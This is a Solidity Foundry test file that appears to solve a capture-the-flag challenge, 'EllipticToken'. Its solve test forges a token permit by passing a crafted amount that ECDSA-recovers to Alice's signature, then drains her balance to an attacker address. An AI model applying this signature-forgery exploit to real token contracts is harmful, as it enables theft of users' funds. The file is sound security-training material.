// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ECDSA} from "openzeppelin-contracts-08/utils/cryptography/ECDSA.sol";
import {EllipticToken} from "../../src/challenge-35-elliptic-token/EllipticToken.sol";

contract EllipticTokenTest is Test {
    EllipticToken token;

    address constant BOB = 0xB0B14927389CB009E0aabedC271AC29320156Eb8;
    address constant ALICE = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;
    uint256 constant INITIAL_AMOUNT = 10 ether;

    bytes aliceSignature =
        hex"ab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";

    bytes bobSignature =
        hex"085a4f70d03930425d3d92b19b9d4e37672a9224ee2cd68381a9854bb3673ef86b35cfdeee0fb1d2168587fb188eefb4fe046109af063bf85d9d3d6859ceb4451c";

    bytes32 salt = keccak256("BOB and ALICE are part of the secret sauce");

    function setUp() public {
        token = new EllipticToken();
        token.transferOwnership(BOB);

        token.redeemVoucher(INITIAL_AMOUNT, ALICE, salt, bobSignature, aliceSignature);
    }

    function testEcrecoverPlayground() public pure {
        bytes32 h = bytes32(uint256(10 ether));

        uint8 v = 27;
        bytes32 r = bytes32(uint256(1));
        bytes32 s = bytes32(uint256(2));

        address signer = ecrecover(h, v, r, s);

        console.log("signer", signer); // 0x3705772bBDb18A2Cc7355F3bF9dD4d891A79eBA8
    }

    function testSolveEllipticToken() public {
        uint256 attackerPk = 0xBEEF;
        address attacker = vm.addr(attackerPk);

        uint256 craftedAmount = uint256(0xebf90284f84cb6e234a8ecf9393afda9c0ede46f4d6df12bd11a4757c42903c0);

        bytes memory tokenOwnerSignature =
            hex"0ab5b8262a97582b1971d68211e37be02ac5d16339cb0278edffc0a465d64aac7b06ed5cd7bc5798089feda2fac7b577ef49e1f2f84a6d2392ff26078f2192a01c";

        address recovered = ECDSA.recover(bytes32(craftedAmount), tokenOwnerSignature);
        assertEq(recovered, ALICE);

        bytes32 permitAcceptHash = keccak256(abi.encodePacked(ALICE, attacker, craftedAmount));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, permitAcceptHash);
        bytes memory spenderSignature = abi.encodePacked(r, s, v);

        vm.startPrank(attacker);
        token.permit(craftedAmount, attacker, tokenOwnerSignature, spenderSignature);
        token.transferFrom(ALICE, attacker, INITIAL_AMOUNT);
        vm.stopPrank();

        assertEq(token.balanceOf(ALICE), 0);
        assertEq(token.balanceOf(attacker), INITIAL_AMOUNT);
    }
}
